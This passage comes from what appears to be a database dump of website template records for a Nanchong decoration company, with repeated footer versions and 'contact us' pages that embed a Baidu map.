[/e:loop]\r\n            </ul>\r\n        </div>\r\n    </div>\r\n    <div class=\\\"news wow fadeInUpBig\\\">\r\n        <div class=\\\"sy_title wow fadeInUp\\\">\r\n            <p>新闻资讯</p>\r\n            <i>NEWS</i>\r\n            <span>完善的质量保证体系和售后服务体系</span>\r\n        </div>\r\n        <div class=\\\"news_content\\\">\r\n            <ul class=\\\"news_l wow fadeInLeft\\\">\r\n                [e:loop={3,4,0,1}]\r\n                <li><img src=\\\'<?=$bqr[\\\'titlepic\\\']?>\\\'>\r\n                    <div class=\\\'news_txt\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><?=$bqr[\\\'title\\\']?>?</a><span>03-09</span>\r\n                        <p><?=$bqr[smalltext]?>...</p>\r\n                    </div>\r\n                </li>\r\n\r\n                [/e:loop]\r\n\r\n\r\n            </ul>\r\n        </div>\r\n        <a href=\\\"/xwzx/qyzx/\\\">查看更多</a>\r\n    </div>\r\n\r\n    [!--temp.footer--]\r\n    <script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <div id=\\\"kefu\\\"></div>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/slick.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/wow.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/rem.min.js\\\"></script>\r\n</body>\r\n\r\n</html>',0,0,'',0,0,'',0,0,0,1600655823,'pubindextemp',1,'admin'),(191,2,'footer','<div class=\\\"footer\\\">\r\n    <div class=\\\"footer1\\\">\r\n        <div class=\\\"ewm wow rollIn\\\"><img src=\\\"/images/ewm.jpg\\\" /><p>扫一扫，关注我们</p></div>\r\n        <div class=\\\"bot_nav\\\">\r\n            <div class=\\\"bot_nav1\\\">\r\n                <a href=\\\"/cpzx/gnxdp/\\\">产品中心</a>\r\n                <a href=\\\"/gywm/gsjj/\\\">关于我们</a>\r\n                <a href=\\\"/xwzx/qyzx/\\\">新闻资讯</a>\r\n                <a href=\\\"/gcal/zxal/\\\">最新案例</a>\r\n                <a href=\\\"/gcal/jdal/\\\">经典案例</a>\r\n                <a href=\\\"/gssl/rrzz/\\\">公司实力</a>\r\n                <a href=\\\"/lxwm/\\\">联系我们</a>\r\n            </div>\r\n        </div>\r\n        <div class=\\\"bot_txt\\\">\r\n            <span>手  机：15196780978(王经理)</span><span>座  机：0817-3618388</span><span style=\\\"margin-right:27px\\\">邮  箱：1024957682@qq.com</span>\r\n            <span>地  址：四川省南充市川东北金融广场五栋18-22号</span>\r\n        </div>\r\n        <div class=\\\"copy\\\">Copyrights  南充市丽邦装饰工程有限公司版权所有    <a href=\\\"http://www.beian.miit.gov.cn/\\\" target=\\\"_blank\\\" style=\\\"color:#fff\\\">蜀ICP备14005687号-1</a><br>\r\n        技术支持 ：<a href=\\\"https://www.shunking.cn/\\\" style=\\\"color: #fff\\\"> 舜王科技</a>\r\n        </div>\r\n\r\n    </div>\r\n\r\n</div>\r\n\r\n<div class=\\\"footers\\\">\r\n    <ul>\r\n        <li><p><img src=\\\"/images/b_ico1.png\\\" /><a href=\\\"/\\\">首页</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico2.png\\\" /><a href=\\\"tel:15196780978\\\">一键呼叫</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico3.png\\\" /><a href=\\\"/cpzx/gnxdp/\\\">产品中心</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico4.png\\\" /><a href=\\\"/gywm/gsjj/\\\">关于我们</a></p></li>\r\n    </ul>\r\n</div>',0,0,'页面尾部',0,0,'',0,0,0,1600655698,'tempvar',1,'admin'),(192,2,'footer','<div class=\\\"footer\\\">\r\n    <div class=\\\"footer1\\\">\r\n        <div class=\\\"ewm wow rollIn\\\"><img src=\\\"/images/ewm.jpg\\\" /><p>扫一扫，关注我们</p></div>\r\n        <div class=\\\"bot_nav\\\">\r\n            <div class=\\\"bot_nav1\\\">\r\n                <a href=\\\"/cpzx/gnxdp/\\\">产品中心</a>\r\n                <a href=\\\"/gywm/gsjj/\\\">关于我们</a>\r\n                <a href=\\\"/xwzx/qyzx/\\\">新闻资讯</a>\r\n                <a href=\\\"/gcal/zxal/\\\">最新案例</a>\r\n                <a href=\\\"/gcal/jdal/\\\">经典案例</a>\r\n                <a href=\\\"/gssl/rrzz/\\\">公司实力</a>\r\n                <a href=\\\"/lxwm/\\\">联系我们</a>\r\n            </div>\r\n        </div>\r\n        <div class=\\\"bot_txt\\\">\r\n            <span>手  机：15196780978(王经理)</span><span>座  机：0817-3618388</span><span>邮  箱：1024957682@qq.com</span>\r\n            <span>地  址：四川省南充市川东北金融广场五栋18-22号</span>\r\n        </div>\r\n        <div class=\\\"copy\\\">Copyrights  南充市丽邦装饰工程有限公司版权所有    <a href=\\\"http://www.beian.miit.gov.cn/\\\" target=\\\"_blank\\\" style=\\\"color:#fff\\\">蜀ICP备14005687号-1</a><br>\r\n        技术支持 ：<a href=\\\"https://www.shunking.cn/\\\" style=\\\"color: #fff\\\"> 舜王科技</a>\r\n        </div>\r\n\r\n    </div>\r\n\r\n</div>\r\n<style>\r\n       .bot_txt span {\r\n    margin-right: 28px;\r\n}\r\n</style>\r\n<div class=\\\"footers\\\">\r\n    <ul>\r\n        <li><p><img src=\\\"/images/b_ico1.png\\\" /><a href=\\\"/\\\">首页</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico2.png\\\" /><a href=\\\"tel:15196780978\\\">一键呼叫</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico3.png\\\" /><a href=\\\"/cpzx/gnxdp/\\\">产品中心</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico4.png\\\" /><a href=\\\"/gywm/gsjj/\\\">关于我们</a></p></li>\r\n    </ul>\r\n</div>',0,0,'页面尾部',0,0,'',0,0,0,1600655790,'tempvar',1,'admin'),(195,2,'footer','<div class=\\\"footer\\\">\r\n    <div class=\\\"footer1\\\">\r\n        <div class=\\\"ewm wow rollIn\\\"><img src=\\\"/images/ewm.jpg\\\" /><p>扫一扫，关注我们</p></div>\r\n        <div class=\\\"bot_nav\\\">\r\n            <div class=\\\"bot_nav1\\\">\r\n                <a href=\\\"/cpzx/gnxdp/\\\">产品中心</a>\r\n                <a href=\\\"/gywm/gsjj/\\\">关于我们</a>\r\n                <a href=\\\"/xwzx/qyzx/\\\">新闻资讯</a>\r\n                <a href=\\\"/gcal/zxal/\\\">最新案例</a>\r\n                <a href=\\\"/gcal/jdal/\\\">经典案例</a>\r\n                <a href=\\\"/gssl/rrzz/\\\">公司实力</a>\r\n                <a href=\\\"/lxwm/\\\">联系我们</a>\r\n            </div>\r\n        </div>\r\n        <div class=\\\"bot_txt\\\">\r\n            <span>手  机：15196780978(王经理)</span><span>座  机：0817-3618388</span><span>邮  箱：1024957682@qq.com</span>\r\n            <span>地  址：四川省南充市川东北金融广场五栋18-22号</span>\r\n        </div>\r\n        <div class=\\\"copy\\\">Copyrights  南充市丽邦装饰工程有限公司版权所有    <a href=\\\"https://beian.miit.gov.cn/#/Integrated/index\\\" target=\\\"_blank\\\" style=\\\"color:#fff\\\">蜀ICP备14005687号-1</a><br>\r\n        技术支持 ：<a href=\\\"https://www.shunking.cn/\\\" style=\\\"color: #fff\\\"> 舜王科技</a>\r\n        </div>\r\n\r\n    </div>\r\n\r\n</div>\r\n<style>\r\n       .bot_txt span {\r\n    margin-right: 28px;\r\n}\r\n</style>\r\n<div class=\\\"footers\\\">\r\n    <ul>\r\n        <li><p><img src=\\\"/images/b_ico1.png\\\" /><a href=\\\"/\\\">首页</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico2.png\\\" /><a href=\\\"tel:15196780978\\\">一键呼叫</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico3.png\\\" /><a href=\\\"/cpzx/gnxdp/\\\">产品中心</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico4.png\\\" /><a href=\\\"/gywm/gsjj/\\\">关于我们</a></p></li>\r\n    </ul>\r\n</div>',0,0,'页面尾部',0,0,'',0,0,0,1609913211,'tempvar',1,'admin'),(177,10,'联系我们内容模板','<!DOCTYPE html\r\n  PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n\r\n<head>\r\n  <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n  <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\" />\r\n  <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n  <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n  <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n  <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\" />\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n  <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <!-- 百度地图 -->\r\n  <script type=\\\"text/javascript\\\" src=\\\"http://api.map.baidu.com/api?v=2.0&ak=IChq54iGzyGEG9ARv2AAZlirX0m0DLwG\\\"></script>\r\n  <style>\r\n    #map {\r\n      overflow: hidden;\r\n      margin: 0 auto;\r\n      width: 80%;\r\n      height: 40%;\r\n    }\r\n  </style>\r\n\r\n</head>\r\n\r\n<body>\r\n  [!--temp.header--]\r\n  <div class=\\\"ny_banner\\\">\r\n    <div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n  </div>\r\n  <div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n      <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n      </div>\r\n\r\n    </div>\r\n  </div>\r\n  <div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n      <div class=\\\"ny_l\\\">\r\n        <div class=\\\"product_l product_l2\\\">\r\n          <dl>\r\n            <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n            [showclasstemp]2,1,0,0[/showclasstemp]\r\n          </dl>\r\n        </div>\r\n        [!--temp.tel--]\r\n      </div>\r\n      <!-- 联系我们文本信息 -->\r\n      <div class=\\\"ny_news_content\\\">\r\n        <div class=\\\"daohang\\\">\r\n          <p>当前位置：[!--newsnav--]\r\n        </div>\r\n        <div class=\\\"ny_newsdetial\\\">\r\n          <div class=\\\"news_name\\\">\r\n            <h2>联系我们</h2>\r\n            <p>&nbsp;</p>\r\n          </div>\r\n          <div class=\\\"prodetail22\\\">\r\n            <p>\r\n              <br />\r\n            </p>\r\n            <p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n              [!--newstext--]\r\n            </p>\r\n          </div>\r\n        </div>\r\n        <div id=\\\"map\\\"></div>\r\n        <script type=\\\"text/javascript\\\">\r\n          //当浏览器窗口大小改变时，设置显示内容的高度\r\n          window.onresize = function () {\r\n            // changeDivHeight();\r\n          }\r\n          var map;\r\n          initMap();\r\n\r\n          function changeDivHeight() {\r\n            // 每次窗口大小改变后调用这个方法\r\n            map.invalidateSize(true);\r\n          }\r\n\r\n\r\n          //创建和初始化地图函数：\r\n          function initMap() {\r\n            createMap();//创建地图\r\n            setMapEvent();//设置地图事件\r\n            addMapControl();//向地图添加控件\r\n            addMapOverlay();//向地图添加覆盖物\r\n          }\r\n\r\n          function createMap() {\r\n            map = new BMap.Map(\\\"map\\\");\r\n            map.centerAndZoom(new BMap.Point(106.074614, 30.775904), 17);\r\n          }\r\n\r\n          function setMapEvent() {\r\n            map.enableScrollWheelZoom();\r\n            map.enableKeyboard();\r\n            map.enableDragging();\r\n            map.enableDoubleClickZoom();\r\n            map.enableAutoResize();\r\n          }\r\n\r\n          function addClickHandler(target, window) {\r\n            target.addEventListener(\\\"click\\\", function () {\r\n              target.openInfoWindow(window);\r\n            });\r\n          }\r\n\r\n          function addMapOverlay() {\r\n            var markers = [\r\n              {\r\n                content: \\\"南充市丽邦装饰工程有限公司\\\",\r\n                title: \\\"南充市丽邦装饰工程有限公司\\\",\r\n                imageOffset: { width: -46, height: 3 },\r\n                position: { lat: 30.774388, lng: 106.07239 }\r\n              }\r\n            ];\r\n            for (var index = 0; index < markers.length; index++) {\r\n              var point = new BMap.Point(markers[index].position.lng, markers[index].position.lat);\r\n              var marker = new BMap.Marker(point, {\r\n                icon: new BMap.Icon(\\\"http://api.map.baidu.com/lbsapi/createmap/images/icon.png\\\", new BMap.Size(20, 25), {\r\n                  imageOffset: new BMap.Size(markers[index].imageOffset.width, markers[index].imageOffset.height)\r\n                })\r\n              });\r\n              var label = new BMap.Label(markers[index].title, { offset: new BMap.Size(25, 5) });\r\n              var opts = {\r\n                width: 200,\r\n                title: markers[index].title,\r\n                enableMessage: false\r\n              };\r\n              var infoWindow = new BMap.InfoWindow(markers[index].content, opts);\r\n              marker.setLabel(label);\r\n              addClickHandler(marker, infoWindow);\r\n              map.addOverlay(marker);\r\n            }\r\n            ;\r\n          }\r\n\r\n          //向地图添加控件\r\n          function addMapControl() {\r\n            var scaleControl = new BMap.ScaleControl({ anchor: BMAP_ANCHOR_BOTTOM_LEFT });\r\n            scaleControl.setUnit(BMAP_UNIT_IMPERIAL);\r\n            map.addControl(scaleControl);\r\n            var navControl = new BMap.NavigationControl({\r\n              anchor: BMAP_ANCHOR_TOP_LEFT,\r\n              type: BMAP_NAVIGATION_CONTROL_LARGE\r\n            });\r\n            map.addControl(navControl);\r\n            var overviewControl = new BMap.OverviewMapControl({ anchor: BMAP_ANCHOR_BOTTOM_RIGHT, isOpen: true });\r\n            map.addControl(overviewControl);\r\n          }\r\n\r\n        </script>\r\n      </div>\r\n    </div>\r\n  </div>\r\n  [!--temp.footer--]\r\n  <script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <div id=\\\"kefu\\\"></div>\r\n  <script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n\r\n</html>',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1589361051,'newstemp',1,'admin'),(178,10,'联系我们内容模板','<!DOCTYPE html\r\n  PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n\r\n<head>\r\n  <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n  <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\" />\r\n  <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n  <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n  <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n  <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\" />\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n  <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <!-- 百度地图 -->\r\n  <script type=\\\"text/javascript\\\" src=\\\"http://api.map.baidu.com/api?v=2.0&ak=IChq54iGzyGEG9ARv2AAZlirX0m0DLwG\\\"></script>\r\n  <style>\r\n    #map {\r\n      overflow: hidden;\r\n      margin: 0 auto;\r\n      width: 80%;\r\n      height: 40%;\r\n    }\r\n  </style>\r\n\r\n</head>\r\n\r\n<body>\r\n  [!--temp.header--]\r\n  <div class=\\\"ny_banner\\\">\r\n    <div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n  </div>\r\n  <div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n      <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n      </div>\r\n\r\n    </div>\r\n  </div>\r\n  <div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n      <div class=\\\"ny_l\\\">\r\n        <div class=\\\"product_l product_l2\\\">\r\n          <dl>\r\n            <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n            [showclasstemp]2,1,0,0[/showclasstemp]\r\n          </dl>\r\n        </div>\r\n        [!--temp.tel--]\r\n      </div>\r\n      <!-- 联系我们文本信息 -->\r\n      <div class=\\\"ny_news_content\\\">\r\n        <div class=\\\"daohang\\\">\r\n          <p>当前位置：[!--newsnav--]\r\n        </div>\r\n        <div class=\\\"ny_newsdetial\\\">\r\n          <div class=\\\"news_name\\\">\r\n            <h2>联系我们</h2>\r\n            <p>&nbsp;</p>\r\n          </div>\r\n          <div class=\\\"prodetail22\\\">\r\n            <p>\r\n              <br />\r\n            </p>\r\n            <p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n              [!--newstext--]\r\n            </p>\r\n          </div>\r\n        </div>\r\n        <div id=\\\"map\\\"></div>\r\n        <script type=\\\"text/javascript\\\">\r\n          //当浏览器窗口大小改变时，设置显示内容的高度\r\n          window.onresize = function () {\r\n            // changeDivHeight();\r\n          }\r\n          var map;\r\n          initMap();\r\n\r\n          function changeDivHeight() {\r\n            // 每次窗口大小改变后调用这个方法\r\n            map.invalidateSize(true);\r\n          }\r\n\r\n\r\n          //创建和初始化地图函数：\r\n          function initMap() {\r\n            createMap();//创建地图\r\n            setMapEvent();//设置地图事件\r\n            addMapControl();//向地图添加控件\r\n            addMapOverlay();//向地图添加覆盖物\r\n          }\r\n\r\n            function createMap(){ \r\n            map = new BMap.Map(\\\"map\\\"); \r\n            map.centerAndZoom(new BMap.Point(106.104154,30.779038),19);\r\n    }\r\n\r\n\r\n          function setMapEvent() {\r\n            map.enableScrollWheelZoom();\r\n            map.enableKeyboard();\r\n            map.enableDragging();\r\n            map.enableDoubleClickZoom();\r\n            map.enableAutoResize();\r\n          }\r\n\r\n          function addClickHandler(target, window) {\r\n            target.addEventListener(\\\"click\\\", function () {\r\n              target.openInfoWindow(window);\r\n            });\r\n          }\r\n\r\n          function addMapOverlay() {\r\n            var markers = [\r\n        {content:\\\"南充市丽邦装饰工程有限公司\\\",title:\\\"南充市丽邦装饰工程有限公司\\\",imageOffset: {width:0,height:3},position:{lat:30.779065,lng:106.103665}}\r\n      ];\r\n            for (var index = 0; index < markers.length; index++) {\r\n              var point = new BMap.Point(markers[index].position.lng, markers[index].position.lat);\r\n              var marker = new BMap.Marker(point, {\r\n                icon: new BMap.Icon(\\\"http://api.map.baidu.com/lbsapi/createmap/images/icon.png\\\", new BMap.Size(20, 25), {\r\n                  imageOffset: new BMap.Size(markers[index].imageOffset.width, markers[index].imageOffset.height)\r\n                })\r\n              });\r\n              var label = new BMap.Label(markers[index].title, { offset: new BMap.Size(25, 5) });\r\n              var opts = {\r\n                width: 200,\r\n                title: markers[index].title,\r\n                enableMessage: false\r\n              };\r\n              var infoWindow = new BMap.InfoWindow(markers[index].content, opts);\r\n              marker.setLabel(label);\r\n              addClickHandler(marker, infoWindow);\r\n              map.addOverlay(marker);\r\n            }\r\n            ;\r\n          }\r\n\r\n          //向地图添加控件\r\n          function addMapControl() {\r\n            var scaleControl = new BMap.ScaleControl({ anchor: BMAP_ANCHOR_BOTTOM_LEFT });\r\n            scaleControl.setUnit(BMAP_UNIT_IMPERIAL);\r\n            map.addControl(scaleControl);\r\n            var navControl = new BMap.NavigationControl({\r\n              anchor: BMAP_ANCHOR_TOP_LEFT,\r\n              type: BMAP_NAVIGATION_CONTROL_LARGE\r\n            });\r\n            map.addControl(navControl);\r\n            var overviewControl = new BMap.OverviewMapControl({ anchor: BMAP_ANCHOR_BOTTOM_RIGHT, isOpen: true });\r\n            map.addControl(overviewControl);\r\n          }\r\n\r\n        </script>\r\n      </div>\r\n    </div>\r\n  </div>\r\n  [!--temp.footer--]\r\n  <script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <div id=\\\"kefu\\\"></div>\r\n  <script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n\r\n</html>',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1589782731,'newstemp',1,'admin'),(185,10,'联系我们内容模板','<!DOCTYPE html\r\n  PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n\r\n<head>\r\n  <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n  <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\" />\r\n  <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n  <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n  <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n  <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\" />\r\n  <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\" />\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n  <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <!-- 百度地图 -->\r\n  <script type=\\\"text/javascript\\\" src=\\\"http://api.map.baidu.com/api?v=2.0&ak=IChq54iGzyGEG9ARv2AAZlirX0m0DLwG\\\"></script>\r\n  <style>\r\n    #map {\r\n      overflow: hidden;\r\n      margin: 0 auto;\r\n      width: 80%;\r\n      height: 300px;\r\n    }\r\n  </style>\r\n\r\n</head>\r\n\r\n<body>\r\n  [!--temp.header--]\r\n  <div class=\\\"ny_banner\\\">\r\n    <div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n  </div>\r\n  <div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n      <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n      </div>\r\n\r\n    </div>\r\n  </div>\r\n  <div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n      <div class=\\\"ny_l\\\">\r\n        <div class=\\\"product_l product_l2\\\">\r\n          <dl>\r\n            <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n            [showclasstemp]2,1,0,0[/showclasstemp]\r\n          </dl>\r\n        </div>\r\n        [!--temp.tel--]\r\n      </div>\r\n      <!-- 联系我们文本信息 -->\r\n      <div class=\\\"ny_news_content\\\">\r\n        <div class=\\\"daohang\\\">\r\n          <p>当前位置：[!--newsnav--]\r\n        </div>\r\n        <div class=\\\"ny_newsdetial\\\">\r\n          <div class=\\\"news_name\\\">\r\n            <h2>联系我们</h2>\r\n            <p>&nbsp;</p>\r\n          </div>\r\n          <div class=\\\"prodetail22\\\">\r\n            <p>\r\n              <br />\r\n            </p>\r\n            <p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n              [!--newstext--]\r\n            </p>\r\n          </div>\r\n        </div>\r\n        <div id=\\\"map\\\"></div>\r\n        <script type=\\\"text/javascript\\\">\r\n          //当浏览器窗口大小改变时，设置显示内容的高度\r\n          window.onresize = function () {\r\n            // changeDivHeight();\r\n          }\r\n          var map;\r\n          initMap();\r\n\r\n          function changeDivHeight() {\r\n            // 每次窗口大小改变后调用这个方法\r\n            map.invalidateSize(true);\r\n          }\r\n\r\n\r\n          //创建和初始化地图函数：\r\n          function initMap() {\r\n            createMap();//创建地图\r\n            setMapEvent();//设置地图事件\r\n            addMapControl();//向地图添加控件\r\n            addMapOverlay();//向地图添加覆盖物\r\n          }\r\n\r\n            function createMap(){ \r\n            map = new BMap.Map(\\\"map\\\"); \r\n            map.centerAndZoom(new BMap.Point(106.104154,30.779038),19);\r\n    }\r\n\r\n\r\n          function setMapEvent() {\r\n            map.enableScrollWheelZoom();\r\n            map.enableKeyboard();\r\n            map.enableDragging();\r\n            map.enableDoubleClickZoom();\r\n            map.enableAutoResize();\r\n          }\r\n\r\n          function addClickHandler(target, window) {\r\n            target.addEventListener(\\\"click\\\", function () {\r\n              target.openInfoWindow(window);\r\n            });\r\n          }\r\n\r\n          function addMapOverlay() {\r\n            var markers = [\r\n        {content:\\\"南充市丽邦装饰工程有限公司\\\",title:\\\"南充市丽邦装饰工程有限公司\\\",imageOffset: {width:0,height:3},position:{lat:30.779065,lng:106.103665}}\r\n      ];\r\n            for (var index = 0; index < markers.length; index++) {\r\n              var point = new BMap.Point(markers[index].position.lng, markers[index].position.lat);\r\n              var marker = new BMap.Marker(point, {\r\n                icon: new BMap.Icon(\\\"http://api.map.baidu.com/lbsapi/createmap/images/icon.png\\\", new BMap.Size(20, 25), {\r\n                  imageOffset: new BMap.Size(markers[index].imageOffset.width, markers[index].imageOffset.height)\r\n                })\r\n              });\r\n              var label = new BMap.Label(markers[index].title, { offset: new BMap.Size(25, 5) });\r\n              var opts = {\r\n                width: 200,\r\n                title: markers[index].title,\r\n                enableMessage: false\r\n              };\r\n              var infoWindow = new BMap.InfoWindow(markers[index].content, opts);\r\n              marker.setLabel(label);\r\n              addClickHandler(marker, infoWindow);\r\n              map.addOverlay(marker);\r\n            }\r\n            ;\r\n          }\r\n\r\n          //向地图添加控件\r\n          function addMapControl() {\r\n            var scaleControl = new BMap.ScaleControl({ anchor: BMAP_ANCHOR_BOTTOM_LEFT });\r\n            scaleControl.setUnit(BMAP_UNIT_IMPERIAL);\r\n            map.addControl(scaleControl);\r\n            var navControl = new BMap.NavigationControl({\r\n              anchor: BMAP_ANCHOR_TOP_LEFT,\r\n              type: BMAP_NAVIGATION_CONTROL_LARGE\r\n            });\r\n            map.addControl(navControl);\r\n            var overviewControl = new BMap.OverviewMapControl({ anchor: BMAP_ANCHOR_BOTTOM_RIGHT, isOpen: true });\r\n            map.addControl(overviewControl);\r\n          }\r\n\r\n        </script>\r\n      </div>\r\n    </div>\r\n  </div>\r\n  [!--temp.footer--]\r\n  <script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <div id=\\\"kefu\\\"></div>\r\n  <script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n  <script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n\r\n</html>',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1589855252,'newstemp',1,'admin'),(181,12,'公司风采内容模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html 